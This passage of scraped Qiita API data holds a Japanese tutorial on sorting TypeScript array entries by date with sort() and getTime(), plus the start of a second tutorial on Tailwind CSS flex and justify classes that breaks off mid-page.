rendered_body":"<h1 data-sourcepos=\"1:1-1:14\">\n<span id=\"はじめに\" class=\"fragment\"></span><a href=\"#%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB\"><i class=\"fa fa-link\"></i></a>はじめに</h1>\n<p data-sourcepos=\"2:1-2:117\">配列内に定義している日付を降順に並べ替える方法について調べたことをまとめます。</p>\n<h1 data-sourcepos=\"4:1-4:8\">\n<span id=\"問題\" class=\"fragment\"></span><a href=\"#%E5%95%8F%E9%A1%8C\"><i class=\"fa fa-link\"></i></a>問題</h1>\n<p data-sourcepos=\"5:1-5:93\">配列を登録データの降順（新しい日付から古い日付）に並べ替えたい</p>\n<h1 data-sourcepos=\"7:1-7:14\">\n<span id=\"解決方法\" class=\"fragment\"></span><a href=\"#%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95\"><i class=\"fa fa-link\"></i></a>解決方法</h1>\n<p data-sourcepos=\"8:1-8:21\">sort()関数を使う</p>\n<p data-sourcepos=\"10:1-10:88\"><iframe id=\"qiita-embed-content__cefec0030100609fe9feae344295559a\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__cefec0030100609fe9feae344295559a\" data-content=\"https%3A%2F%2Fdeveloper.mozilla.org%2Fja%2Fdocs%2FWeb%2FJavaScript%2FReference%2FGlobal_Objects%2FArray%2Fsort\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"13:1-13:77\">比較関数 <code>(a, b) =&gt; 戻り値</code> の戻り値で順序が決まります。</p>\n<ul data-sourcepos=\"14:1-17:0\">\n<li data-sourcepos=\"14:1-14:45\">\n<strong>戻り値が負の数</strong>: aを前に配置</li>\n<li data-sourcepos=\"15:1-15:47\">\n<strong>戻り値が正の数</strong>: bを前に配置</li>\n<li data-sourcepos=\"16:1-17:0\">\n<strong>戻り値が0</strong>: 順序を変更しない</li>\n</ul>\n<p data-sourcepos=\"18:1-18:33\">で並び替えを行います。</p>\n<div class=\"code-frame\" data-lang=\"tsx\" data-sourcepos=\"20:1-38:3\"><div class=\"highlight\"><pre><code><span class=\"kd\">type</span> <span class=\"nx\">all_data</span> <span class=\"o\">=</span> <span class=\"p\">{</span>\n  <span class=\"na\">title</span><span class=\"p\">:</span> <span class=\"kr\">string</span><span class=\"p\">;</span>\n  <span class=\"nl\">key</span><span class=\"p\">:</span> <span class=\"kr\">string</span><span class=\"p\">;</span>\n  <span class=\"nl\">url</span><span class=\"p\">:</span> <span class=\"kr\">string</span><span class=\"p\">;</span>\n  <span class=\"nl\">image_url</span><span class=\"p\">:</span> <span class=\"kr\">string</span><span class=\"p\">;</span>\n  <span class=\"nl\">description</span><span class=\"p\">:</span> <span class=\"kr\">string</span> <span class=\"o\">|</span> <span class=\"kc\">undefined</span><span class=\"p\">;</span>\n  <span class=\"nl\">updated_at</span><span class=\"p\">:</span> <span class=\"kr\">string</span><span class=\"p\">;</span>\n<span class=\"p\">};</span>\n\n<span class=\"kd\">const</span> <span class=\"nx\">all_data</span><span class=\"p\">:</span> <span class=\"nx\">all_data</span><span class=\"p\">[]</span> <span class=\"o\">=</span> <span class=\"p\">[];</span>\n<span class=\"c1\">// 値の設定は省略</span>\n\n<span class=\"c1\">// 日付順（降順）に並び替え</span>\n  <span class=\"nx\">all_data</span><span class=\"p\">.</span><span class=\"nf\">sort</span><span class=\"p\">(</span>\n     <span class=\"p\">(</span><span class=\"nx\">a</span><span class=\"p\">,</span> <span class=\"nx\">b</span><span class=\"p\">)</span> <span class=\"o\">=&gt;</span>\n      <span class=\"k\">new</span> <span class=\"nc\">Date</span><span class=\"p\">(</span><span class=\"nx\">b</span><span class=\"p\">.</span><span class=\"nx\">updated_at</span><span class=\"p\">).</span><span class=\"nf\">getTime</span><span class=\"p\">()</span> <span class=\"o\">-</span> <span class=\"k\">new</span> <span class=\"nc\">Date</span><span class=\"p\">(</span><span class=\"nx\">a</span><span class=\"p\">.</span><span class=\"nx\">updated_at</span><span class=\"p\">).</span><span class=\"nf\">getTime</span><span class=\"p\">()</span>\n  <span class=\"p\">);</span>\n</code></pre></div></div>\n<ul data-sourcepos=\"40:1-42:0\">\n<li data-sourcepos=\"40:1-40:77\">降順（新しい日付から古い日付）の場合：<code>b-a &gt; 0</code>を計算</li>\n<li data-sourcepos=\"41:1-42:0\">昇順（古い日付から新しい日付）の場合：<code>a-b &gt; 0</code>を計算</li>\n</ul>\n<p data-sourcepos=\"43:1-43:92\">bの日付が新しい場合、<code>b-a &gt; 0</code>となり、bの要素が前に配置されます。</p>\n<p data-sourcepos=\"45:1-45:81\">all_data.sort()で行うと、文字列での比較になってしまいます。</p>\n<h2 data-sourcepos=\"47:1-47:33\">\n<span id=\"なぜgettimeを使うのか\" class=\"fragment\"></span><a href=\"#%E3%81%AA%E3%81%9Cgettime%E3%82%92%E4%BD%BF%E3%81%86%E3%81%AE%E3%81%8B\"><i class=\"fa fa-link\"></i></a>なぜgetTime()を使うのか</h2>\n<p data-sourcepos=\"48:1-50:60\">dateでオブジェクトを作成し、引き算を行った場合、暗黙的な型変換が行われます。<br>\ngetTime()を明示的に指定することで、ミリ秒の数値をnumber型で返却し、引き算を行ってくれます。<br>\nnumber型を明示的に指定することができます。</p>\n<div class=\"code-frame\" data-lang=\"ts\" data-sourcepos=\"52:1-64:3\"><div class=\"highlight\"><pre><code>  <span class=\"c1\">// Date型の計算、暗黙的に型変換してくれている</span>\n  <span class=\"nx\">all_data</span><span class=\"p\">.</span><span class=\"nf\">sort</span><span class=\"p\">(</span>\n    <span class=\"p\">(</span><span class=\"nx\">a</span><span class=\"p\">,</span> <span class=\"nx\">b</span><span class=\"p\">)</span> <span class=\"o\">=&gt;</span>\n      <span class=\"k\">new</span> <span class=\"nc\">Date</span><span class=\"p\">(</span><span class=\"nx\">b</span><span class=\"p\">.</span><span class=\"nx\">updated_at</span><span class=\"p\">)</span> <span class=\"o\">-</span> <span class=\"k\">new</span> <span class=\"nc\">Date</span><span class=\"p\">(</span><span class=\"nx\">a</span><span class=\"p\">.</span><span class=\"nx\">updated_at</span><span class=\"p\">)</span>\n  <span class=\"p\">);</span>\n\n    <span class=\"c1\">// number型に変換</span>\n    <span class=\"nx\">all_data</span><span class=\"p\">.</span><span class=\"nf\">sort</span><span class=\"p\">(</span>\n     <span class=\"p\">(</span><span class=\"nx\">a</span><span class=\"p\">,</span> <span class=\"nx\">b</span><span class=\"p\">)</span> <span class=\"o\">=&gt;</span>\n      <span class=\"k\">new</span> <span class=\"nc\">Date</span><span class=\"p\">(</span><span class=\"nx\">b</span><span class=\"p\">.</span><span class=\"nx\">updated_at</span><span class=\"p\">).</span><span class=\"nf\">getTime</span><span class=\"p\">()</span> <span class=\"o\">-</span> <span class=\"k\">new</span> <span class=\"nc\">Date</span><span class=\"p\">(</span><span class=\"nx\">a</span><span class=\"p\">.</span><span class=\"nx\">updated_at</span><span class=\"p\">).</span><span class=\"nf\">getTime</span><span class=\"p\">()</span>\n  <span class=\"p\">);</span>\n</code></pre></div></div>\n<p data-sourcepos=\"66:1-66:87\"><iframe id=\"qiita-embed-content__44ff364ea8ef38b5c17c3e7524daf047\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__44ff364ea8ef38b5c17c3e7524daf047\" data-content=\"https%3A%2F%2Fdeveloper.mozilla.org%2Fja%2Fdocs%2FWeb%2FJavaScript%2FReference%2FGlobal_Objects%2FDate%2FDate\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<h1 data-sourcepos=\"68:1-68:14\">\n<span id=\"おわりに\" class=\"fragment\"></span><a href=\"#%E3%81%8A%E3%82%8F%E3%82%8A%E3%81%AB\"><i class=\"fa fa-link\"></i></a>おわりに</h1>\n<p data-sourcepos=\"69:1-69:99\">日付のソートは、型変換を意識しないといけないと思える出来事でした。</p>\n<h1 data-sourcepos=\"71:1-71:8\">\n<span id=\"参考\" class=\"fragment\"></span><a href=\"#%E5%8F%82%E8%80%83\"><i class=\"fa fa-link\"></i></a>参考</h1>\n<p data-sourcepos=\"73:1-73:88\"><iframe id=\"qiita-embed-content__95e8b515d33720ac829734301264ef1d\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__95e8b515d33720ac829734301264ef1d\" data-content=\"https%3A%2F%2Fdeveloper.mozilla.org%2Fja%2Fdocs%2FWeb%2FJavaScript%2FReference%2FGlobal_Objects%2FArray%2Fsort\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"75:1-75:87\"><iframe id=\"qiita-embed-content__808855af99ed8f514cc18f4e6370e012\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__808855af99ed8f514cc18f4e6370e012\" data-content=\"https%3A%2F%2Fdeveloper.mozilla.org%2Fja%2Fdocs%2FWeb%2FJavaScript%2FReference%2FGlobal_Objects%2FDate%2FDate\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n","body":"# はじめに\n配列内に定義している日付を降順に並べ替える方法について調べたことをまとめます。\n\n# 問題\n配列を登録データの降順（新しい日付から古い日付）に並べ替えたい\n\n# 解決方法\nsort()関数を使う\n\nhttps://developer.mozilla.org/ja/docs/Web/JavaScript/Reference/Global_Objects/Array/sort\n\n\n比較関数 `(a, b) => 戻り値` の戻り値で順序が決まります。\n- **戻り値が負の数**: aを前に配置\n- **戻り値が正の数**: bを前に配置  \n- **戻り値が0**: 順序を変更しない\n\nで並び替えを行います。\n\n```tsx\ntype all_data = {\n  title: string;\n  key: string;\n  url: string;\n  image_url: string;\n  description: string | undefined;\n  updated_at: string;\n};\n\nconst all_data: all_data[] = [];\n// 値の設定は省略\n\n// 日付順（降順）に並び替え\n  all_data.sort(\n     (a, b) =>\n      new Date(b.updated_at).getTime() - new Date(a.updated_at).getTime()\n  );\n```\n\n* 降順（新しい日付から古い日付）の場合：`b-a > 0`を計算\n* 昇順（古い日付から新しい日付）の場合：`a-b > 0`を計算\n\nbの日付が新しい場合、`b-a > 0`となり、bの要素が前に配置されます。\n\nall_data.sort()で行うと、文字列での比較になってしまいます。\n\n## なぜgetTime()を使うのか\ndateでオブジェクトを作成し、引き算を行った場合、暗黙的な型変換が行われます。\ngetTime()を明示的に指定することで、ミリ秒の数値をnumber型で返却し、引き算を行ってくれます。\nnumber型を明示的に指定することができます。\n\n```ts\n  // Date型の計算、暗黙的に型変換してくれている\n  all_data.sort(\n    (a, b) =>\n      new Date(b.updated_at) - new Date(a.updated_at)\n  );\n\n    // number型に変換\n    all_data.sort(\n     (a, b) =>\n      new Date(b.updated_at).getTime() - new Date(a.updated_at).getTime()\n  );\n```\n\nhttps://developer.mozilla.org/ja/docs/Web/JavaScript/Reference/Global_Objects/Date/Date\n\n# おわりに\n日付のソートは、型変換を意識しないといけないと思える出来事でした。\n\n# 参考\n\nhttps://developer.mozilla.org/ja/docs/Web/JavaScript/Reference/Global_Objects/Array/sort\n\nhttps://developer.mozilla.org/ja/docs/Web/JavaScript/Reference/Global_Objects/Date/Date\n","coediting":false,"comments_count":0,"created_at":"2025-09-13T13:02:47+09:00","group":null,"id":"36702b824bfac86140dc","likes_count":1,"private":false,"reactions_count":0,"stocks_count":0,"tags":[{"name":"JavaScript","versions":[]},{"name":"TypeScript","versions":[]}],"title":"【TypeScript 】配列内に定義している日付を昇順に並べ替えたい","updated_at":"2025-09-13T13:02:47+09:00","url":"https://qiita.com/asa129/items/36702b824bfac86140dc","user":{"description":"0→1でWebアプリケーションを作れるようになるために奮闘中です。\r\nアイコンは@chinchilla.maruさん\r\nhttps://www.instagram.com/chinchilla.maru/","facebook_id":"","followees_count":45,"followers_count":53,"github_login_name":"asa129","id":"asa129","items_count":62,"linkedin_id":"","location":"","name":"","organization":"","permanent_id":3993509,"profile_image_url":"https://s3-ap-northeast-1.amazonaws.com/qiita-image-store/0/3993509/ea9105b8f7fedddb7175e913eeb5c288385a364a/large.png?1739071881","team_only":false,"twitter_screen_name":"jad1290","website_url":""},"page_views_count":387,"team_membership":null,"organization_url_name":"jisou","slide":false},{"rendered_body":"<h1 data-sourcepos=\"1:1-1:14\">\n<span id=\"はじめに\" class=\"fragment\"></span><a href=\"#%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB\"><i class=\"fa fa-link\"></i></a>はじめに</h1>\n<p data-sourcepos=\"2:1-2:301\">tailwindcssを使う際、各ボックスを横並びにするときは<code>flex</code>、縦並びにするときは<code>flex-col</code>をなんとなく使用していました。<code>flex</code>や<code>flex-col</code>、<code>justify-XXX</code>や<code>items-xxx</code>の指定はそれぞれ何を意味するのか、学んだことをまとめました。</p>\n<h1 data-sourcepos=\"4:1-4:29\">\n<span id=\"1flexを確認してみる\" class=\"fragment\"></span><a href=\"#1flex%E3%82%92%E7%A2%BA%E8%AA%8D%E3%81%97%E3%81%A6%E3%81%BF%E3%82%8B\"><i class=\"fa fa-link\"></i></a>1.flexを確認してみる</h1>\n<p data-sourcepos=\"6:1-6:43\"><iframe id=\"qiita-embed-content__10e29a11da388c4e5650b3b94db4a088\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__10e29a11da388c4e5650b3b94db4a088\" data-content=\"https%3A%2F%2Ftailwindcss.com%2Fdocs%2Fflex-direction\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<h2 data-sourcepos=\"8:1-8:19\">\n<span id=\"横並びflex\" class=\"fragment\"></span><a href=\"#%E6%A8%AA%E4%B8%A6%E3%81%B3flex\"><i class=\"fa fa-link\"></i></a>横並び：flex</h2>\n<div class=\"code-frame\" data-lang=\"tsx\" data-sourcepos=\"10:1-16:3\"><div class=\"highlight\"><pre><code>      <span class=\"p\">&lt;</span><span class=\"nt\">div</span> <span class=\"na\">class</span><span class=\"p\">=</span><span class=\"s\">\"flex h-32 bg-gray-200\"</span><span class=\"p\">&gt;</span>\n        <span class=\"p\">&lt;</span><span class=\"nt\">div</span> <span class=\"na\">class</span><span class=\"p\">=</span><span class=\"s\">\"bg-blue-500 p-2 m-2\"</span><span class=\"p\">&gt;</span>ボックス<span class=\"p\">&lt;/</span><span class=\"nt\">div</span><span class=\"p\">&gt;</span>\n        <span class=\"p\">&lt;</span><span class=\"nt\">div</span> <span class=\"na\">class</span><span class=\"p\">=</span><span class=\"s\">\"bg-blue-500 p-2 m-2\"</span><span class=\"p\">&gt;</span>ボックス<span class=\"p\">&lt;/</span><span class=\"nt\">div</span><span class=\"p\">&gt;</span>\n        <span class=\"p\">&lt;</span><span class=\"nt\">div</span> <span class=\"na\">class</span><span class=\"p\">=</span><span class=\"s\">\"bg-blue-500 p-2 m-2\"</span><span class=\"p\">&gt;</span>ボックス<span class=\"p\">&lt;/</span><span class=\"nt\">div</span><span class=\"p\">&gt;</span>\n      <span class=\"p\">&lt;/</span><span class=\"nt\">div</span><span class=\"p\">&gt;</span>\n</code></pre></div></div>\n<p data-sourcepos=\"18:1-18:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F0a69c7d0-f01a-42a2-b701-3afd6aed329a.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=a145cf35d2bfb2cd895c4ab328db4731\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F0a69c7d0-f01a-42a2-b701-3afd6aed329a.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=a145cf35d2bfb2cd895c4ab328db4731\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F0a69c7d0-f01a-42a2-b701-3afd6aed329a.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=6b693995c726dcf28b165b8c70e07735 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/0a69c7d0-f01a-42a2-b701-3afd6aed329a.png\" loading=\"lazy\"></a></p>\n<h2 data-sourcepos=\"20:1-20:23\">\n<span id=\"横並びflex-row\" class=\"fragment\"></span><a href=\"#%E6%A8%AA%E4%B8%A6%E3%81%B3flex-row\"><i class=\"fa fa-link\"></i></a>横並び：flex-row</h2>\n<div class=\"code-frame\" data-lang=\"tsx\" data-sourcepos=\"22:1-28:3\"><div class=\"highlight\"><pre><code>      <span class=\"p\">&lt;</span><span class=\"nt\">div</span> <span class=\"na\">class</span><span class=\"p\">=</span><span class=\"s\">\"flex flex-row h-32 bg-gray-200\"</span><span class=\"p\">&gt;</span>\n        <span class=\"p\">&lt;</span><span class=\"nt\">div</span> <span class=\"na\">class</span><span class=\"p\">=</span><span class=\"s\">\"bg-blue-500 p-2 m-2\"</span><span class=\"p\">&gt;</span>ボックス<span class=\"p\">&lt;/</span><span class=\"nt\">div</span><span class=\"p\">&gt;</span>\n        <span class=\"p\">&lt;</span><span class=\"nt\">div</span> <span class=\"na\">class</span><span class=\"p\">=</span><span class=\"s\">\"bg-blue-500 p-2 m-2\"</span><span class=\"p\">&gt;</span>ボックス<span class=\"p\">&lt;/</span><span class=\"nt\">div</span><span class=\"p\">&gt;</span>\n        <span class=\"p\">&lt;</span><span class=\"nt\">div</span> <span class=\"na\">class</span><span class=\"p\">=</span><span class=\"s\">\"bg-blue-500 p-2 m-2\"</span><span class=\"p\">&gt;</span>ボックス<span class=\"p\">&lt;/</span><span class=\"nt\">div</span><span class=\"p\">&gt;</span>\n      <span class=\"p\">&lt;/</span><span class=\"nt\">div</span><span class=\"p\">&gt;</span>\n</code></pre></div></div>\n<p data-sourcepos=\"30:1-30:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fce6fd9de-5470-4919-8b9a-c0699011644d.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=b9a4e8383d71c01357e8c40eb9d6c82b\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fce6fd9de-5470-4919-8b9a-c0699011644d.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=b9a4e8383d71c01357e8c40eb9d6c82b\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fce6fd9de-5470-4919-8b9a-c0699011644d.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=0c612bf32ea9b976337843f430b09635 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/ce6fd9de-5470-4919-8b9a-c0699011644d.png\" loading=\"lazy\"></a></p>\n<h2 data-sourcepos=\"33:1-33:23\">\n<span id=\"縦並びflex-col\" class=\"fragment\"></span><a href=\"#%E7%B8%A6%E4%B8%A6%E3%81%B3flex-col\"><i class=\"fa fa-link\"></i></a>縦並び：flex-col</h2>\n<div class=\"code-frame\" data-lang=\"tsx\" data-sourcepos=\"34:1-40:3\"><div class=\"highlight\"><pre><code>      <span class=\"p\">&lt;</span><span class=\"nt\">div</span> <span class=\"na\">class</span><span class=\"p\">=</span><span class=\"s\">\"flex flex-col h-32 bg-gray-200\"</span><span class=\"p\">&gt;</span>\n        <span class=\"p\">&lt;</span><span class=\"nt\">div</span> <span class=\"na\">class</span><span class=\"p\">=</span><span class=\"s\">\"bg-blue-500 p-2 m-2\"</span><span class=\"p\">&gt;</span>ボックス<span class=\"p\">&lt;/</span><span class=\"nt\">div</span><span class=\"p\">&gt;</span>\n        <span class=\"p\">&lt;</span><span class=\"nt\">div</span> <span class=\"na\">class</span><span class=\"p\">=</span><span class=\"s\">\"bg-blue-500 p-2 m-2\"</span><span class=\"p\">&gt;</span>ボックス<span class=\"p\">&lt;/</span><span class=\"nt\">div</span><span class=\"p\">&gt;</span>\n        <span class=\"p\">&lt;</span><span class=\"nt\">div</span> <span class=\"na\">class</span><span class=\"p\">=</span><span class=\"s\">\"bg-blue-500 p-2 m-2\"</span><span class=\"p\">&gt;</span>ボックス<span class=\"p\">&lt;/</span><span class=\"nt\">div</span><span class=\"p\">&gt;</span>\n      <span class=\"p\">&lt;/</span><span class=\"nt\">div</span><span class=\"p\">&gt;</span>\n</code></pre></div></div>\n<p data-sourcepos=\"42:1-42:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fe269798c-abac-41c3-b93b-9d25b77f1872.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=bc59dd262902febe46312b92375de63e\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fe269798c-abac-41c3-b93b-9d25b77f1872.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=bc59dd262902febe46312b92375de63e\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fe269798c-abac-41c3-b93b-9d25b77f1872.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=71eda5efd95bff7ea36ff81b43ba3fe3 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/e269798c-abac-41c3-b93b-9d25b77f1872.png\" loading=\"lazy\"></a></p>\n<h1 data-sourcepos=\"44:1-44:39\">\n<span id=\"2justify-xxxxxxを確認してみる\" class=\"fragment\"></span><a href=\"#2justify-xxxxxx%E3%82%92%E7%A2%BA%E8%AA%8D%E3%81%97%E3%81%A6%E3%81%BF%E3%82%8B\"><i class=\"fa fa-link\"></i></a>2.justify-xxxxxxを確認してみる</h1>\n<ul data-sourcepos=\"46:1-47:0\">\n<li data-sourcepos=\"46:1-47:0\">\n<code>justify-XXXX</code>：<strong>主軸</strong>に対して、操作をする</li>\n</ul>\n<p data-sourcepos=\"48:1-49:107\">flexの場合、主軸は<code>水平方向</code>、flex-colの場合、主軸は<code>垂直方向</code>になります。<br>\njustify-centerを指定し、主軸の中央にボックスが配置されるように設定しました。</p>\n<div class=\"code-frame\" data-lang=\"diff_tsx\" data-sourcepos=\"51:1-63:3\"><div class=\"highlight\"><pre><code>      <span class=\"p\">&lt;</span><span class=\"nt\">div</span> <span class=\"na\">class</span><span class=\"p\">=</span><span class=\"s\">\"flex justify-center items-center h-32 bg-gray-200\"</span><span class=\"p\">&gt;</span>\n        <span class=\"p\">&lt;</span><span class=\"nt\">div</span> <span class=\"na\">class</span><span class=\"p\">=</span><span class=\"s\">\"bg-blue-500 p-2 m-2\"</span><span class=\"p\">&gt;</span>ボックス<span class=\"p\">&lt;/</span><span class=\"nt\">div</span><span class=\"p\">&gt;</span>\n        <span class=\"p\">&lt;</span><span class=\"nt\">div</span> <span class=\"na\">class</span><span class=\"p\">=</span><span class=\"s\">\"bg-blue-500 p-2 m-2\"</span><span class=\"p\">&gt;</span>ボックス<span class=\"p\">&lt;/</span><span class=\"nt\">div</span><span class=\"p\">&gt;</span>\n      <span class=\"p\">&lt;/</span><span class=\"nt\">div</span><span class=\"p\">&gt;</span>\n\n      <span class=\"p\">&lt;</span><span class=\"nt\">div</span> <span class=\"na\">class</span><span class=\"p\">=</span><span class=\"s\">\"h-2 bg-white-200\"</span><span class=\"p\">&gt;&lt;/</span><span class=\"nt\">div</span><span class=\"p\">&gt;</span>\n\n      <span class=\"p\">&lt;</span><span class=\"nt\">div</span> <span class=\"na\">class</span><span class=\"p\">=</span><span class=\"s\">\"flex flex-col justify-center items-center h-32 bg-gray-200\"</span><span class=\"p\">&gt;</span>\n        <span class=\"p\">&lt;</span><span class=\"nt\">div</span> <span class=\"na\">class</span><span class=\"p\">=</span><span class=\"s\">\"bg-blue-500 p-2 m-2\"</span><span class=\"p\">&gt;</span>ボックス<span class=\"p\">&lt;/</span><span class=\"nt\">div</span><span class=\"p\">&gt;</span>\n        <span class=\"p\">&lt;</span><span class=\"nt\">div</span> <span class=\"na\">class</span><span class=\"p\">=</span><span class=\"s\">\"bg-blue-500 p-2 m-2\"</span><span class=\"p\">&gt;</span>ボックス<span class=\"p\">&lt;/</span><span class=\"nt\">div</span><span class=\"p\">&gt;</span>\n      <span class=\"p\">&lt;/</span><span class=\"nt\">div</span><span class=\"p\">&gt;</span>\n</code></pre></div></div>\n<p data-sourcepos=\"65:1-65:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Ff7387955-349f-4b7e-a52f-9ee01f25a083.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=512b65247d1160efb0157b5d36e61889\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Ff7387955-349f-4b7e-a52f-9ee01f25a083.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=512b65247d1160efb0157b5d36e61889\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Ff7387955-349f-4b7e-a52f-9ee01f25a083.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=94626a328db48e94b17e8b50fae51654 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/f7387955-349f-4b7e-a52f-9ee01f25a083.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"67:1-67:68\">justify-centerを消すとどうなるかを確認してみます。</p>\n<div class=\"code-frame\" data-lang=\"diff_tsx\" data-sourcepos=\"68:1-82:3\"><div class=\"highlight\"><pre><code><span class=\"hdl\"><span class=\"o\">- </span>     <span class=\"o\">&lt;</span><span class=\"nx\">div</span> <span class=\"kd\">class</span><span class=\"o\">=</span><span class=\"dl\">\"</span><span class=\"s2\">flex justify-center items-center h-32 bg-gray-200</span><span class=\"dl\">\"</span><span class=\"o\">&gt;</span>\n</span><span class=\"hil\"><span class=\"o\">+ </span>     <span class=\"o\">&lt;</span><span class=\"nx\">div</span> <span class=\"kd\">class</span><span class=\"o\">=</span><span class=\"dl\">\"</span><span class=\"s2\">flex items-center h-32 bg-gray-200</span><span class=\"dl\">\"</span><span class=\"o\">&gt;</span>\n</span>        <span class=\"p\">&lt;</span><span class=\"nt\">div</span> <span class=\"na\">class</span><span class=\"p\">=</span><span class=\"s\">\"bg-blue-500 p-2 m-2\"</span><span class=\"p\">&gt;</span>ボックス<span class=\"p\">&lt;/</span><span class=\"nt\">div</span><span class=\"p\">&gt;</span>\n        <span class=\"p\">&lt;</span><span class=\"nt\">div</span> <span class=\"na\">class</span><span class=\"p\">=</span><span class=\"s\">\"bg-blue-500 p-2 m-2\"</span><span class=\"p\">&gt;</span>ボックス<span class=\"p\">&lt;/</span><span class=\"nt\">div</span><span class=\"p\">&gt;</span>\n      <span class=\"p\">&lt;</span><span class=\"err\">/</span><span class=\"na\">div</span><span class=\"p\">&gt;</span>\n\n      <span class=\"p\">&lt;</span><span class=\"nt\">div</span> <span class=\"na\">class</span><span class=\"p\">=</span><span class=\"s\">\"h-2 bg-white-200\"</span><span class=\"p\">&gt;&lt;/</span><span class=\"nt\">div</span><span class=\"p\">&gt;</span>\n\n<span class=\"hdl\">-      <span class=\"p\">&lt;</span><span class=\"nt\">div</span> <span class=\"na\">class</span><span class=\"p\">=</span><span class=\"s\">\"flex flex-col justify-center items-center h-32 bg-gray-200\"</span><span class=\"p\">&gt;</span>\n</span><span class=\"hil\">+      <span class=\"p\">&lt;</span><span class=\"nt\">div</span> <span class=\"na\">class</span><span class=\"p\">=</span><span class=\"s\">\"flex flex-col items-center h-32 bg-gray-200\"</span><span class=\"p\">&gt;</span>\n</span>        <span class=\"p\">&lt;</span><span class=\"nt\">div</span> <span class=\"na\">class</span><span class=\"p\">=</span><span class=\"s\">\"bg-blue-500 p-2 m-2\"</span><span class=\"p\">&gt;</span>ボックス<span class=\"p\">&lt;/</span><span class=\"nt\">div</span><span class=\"p\">&gt;</span>\n        <span class=\"p\">&lt;</span><span class=\"nt\">div</span> <span class=\"na\">class</span><span class=\"p\">=</span><span class=\"s\">\"bg-blue-500 p-2 m-2\"</span><span class=\"p\">&gt;</span>ボックス<span class=\"p\">&lt;/</span><span class=\"nt\">div</span><span class=\"p\">&gt;</span>\n      <span class=\"p\">&lt;/</span><span class=\"nt\">div</span><span class=\"p\">&gt;</span>\n</code></pre></div></div>\n<p 